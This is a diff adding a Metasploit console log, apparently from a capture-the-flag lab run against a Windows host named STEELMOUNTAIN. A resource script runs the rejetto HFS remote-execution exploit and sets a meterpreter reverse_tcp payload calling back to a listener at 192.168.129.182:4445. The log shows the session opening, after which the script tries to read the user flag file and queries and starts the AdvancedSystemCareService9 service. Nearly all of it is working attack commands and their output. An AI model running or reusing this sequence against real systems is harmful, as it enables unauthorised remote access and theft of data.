@@ -1,0 +1,63 @@
+[*] Spooling to file /home/kali/Redteam-Hermes/logs/steel_state/stable_attempt.log...
+resource (/tmp/steel_stable.rc)> use exploit/windows/http/rejetto_hfs_exec
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+resource (/tmp/steel_stable.rc)> set RHOSTS 10.146.141.173
+RHOSTS => 10.146.141.173
+resource (/tmp/steel_stable.rc)> set RPORT 8080
+RPORT => 8080
+resource (/tmp/steel_stable.rc)> set payload windows/meterpreter_reverse_tcp
+payload => windows/meterpreter_reverse_tcp
+resource (/tmp/steel_stable.rc)> set LHOST 192.168.129.182
+LHOST => 192.168.129.182
+resource (/tmp/steel_stable.rc)> set LPORT 4445
+LPORT => 4445
+resource (/tmp/steel_stable.rc)> run -z
+[*] Started reverse TCP handler on 192.168.129.182:4445 
+[*] Using URL: http://192.168.129.182:8080/p3rAwAcoPOP6
+[*] Server started.
+[*] Sending a malicious request to /
+[*] Payload request received: /p3rAwAcoPOP6
+[!] Tried to delete %TEMP%\NrSKGehILpT.vbs, unknown result
+[*] Meterpreter session 1 opened (192.168.129.182:4445 -> 10.146.141.173:51499) at 2026-05-22 17:03:28 -0700
+[*] Server stopped.
+[*] Session 1 created in the background.
+resource (/tmp/steel_stable.rc)> sleep 10
+resource (/tmp/steel_stable.rc)> sessions -l
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information                         Connection
+  --  ----  ----                     -----------                         ----------
+  1         meterpreter x86/windows  STEELMOUNTAIN\bill @ STEELMOUNTAIN  192.168.129.182:4445 -> 10.146.141.173:51499 (10.146.141.173)
+
+resource (/tmp/steel_stable.rc)> sessions -i 1 -C "getuid"
+[*] Running 'getuid' on meterpreter session 1 (10.146.141.173)
+Server username: STEELMOUNTAIN\bill
+resource (/tmp/steel_stable.rc)> sessions -i 1 -C "shell -c whoami"
+[*] Running 'shell -c whoami' on meterpreter session 1 (10.146.141.173)
+Process 2700 created.
+Channel 2 created.
+
+Terminate channel 2? [y/N]  [-] Failed to spawn shell with thread impersonation. Retrying without it.
+[-] Send timed out. Timeout currently 15 seconds, you can configure this with sessions -C <cmd> --timeout <value>
+resource (/tmp/steel_stable.rc)> sessions -i 1 -C "shell -c type C:\\Users\\bill\\Desktop\\user.txt"
+[*] Running 'shell -c type C:\Users\bill\Desktop\user.txt' on meterpreter session 1 (10.146.141.173)
+[-] Send timed out. Timeout currently 15 seconds, you can configure this with sessions -C <cmd> --timeout <value>
+resource (/tmp/steel_stable.rc)> sessions -i 1 -C "shell -c sc qc AdvancedSystemCareService9"
+[*] Running 'shell -c sc qc AdvancedSystemCareService9' on meterpreter session 1 (10.146.141.173)
+[-] Send timed out. Timeout currently 15 seconds, you can configure this with sessions -C <cmd> --timeout <value>
+resource (/tmp/steel_stable.rc)> sessions -i 1 -C "shell -c net start AdvancedSystemCareService9"
+[*] Running 'shell -c net start AdvancedSystemCareService9' on meterpreter session 1 (10.146.141.173)
+[-] Send timed out. Timeout currently 15 seconds, you can configure this with sessions -C <cmd> --timeout <value>
+resource (/tmp/steel_stable.rc)> sleep 8
+resource (/tmp/steel_stable.rc)> sessions -l
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information                         Connection
+  --  ----  ----                     -----------                         ----------
+  1         meterpreter x86/windows  STEELMOUNTAIN\bill @ STEELMOUNTAIN  192.168.129.182:4445 -> 10.146.141.173:51499 (10.146.141.173)
+
+resource (/tmp/steel_stable.rc)> spool off
